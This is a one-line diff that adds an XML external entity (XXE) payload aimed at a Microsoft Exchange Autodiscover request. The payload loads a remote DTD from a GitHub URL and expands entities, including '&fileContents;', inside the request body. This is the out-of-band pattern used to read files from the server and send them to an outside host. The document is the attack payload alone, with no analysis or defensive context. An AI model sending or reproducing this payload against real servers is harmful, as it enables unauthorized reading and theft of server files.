@@ -1,0 +1,1 @@
+<!DOCTYPE Autodiscover[<!ENTITY % dtd SYSTEM 'https://github.com/Damon-Liu/payload/blob/master/test.dtd'>%dtd;%all;]><Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'><Request><EMailAddress>aaaaa</EMailAddress><AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema></Request></Autodiscover>
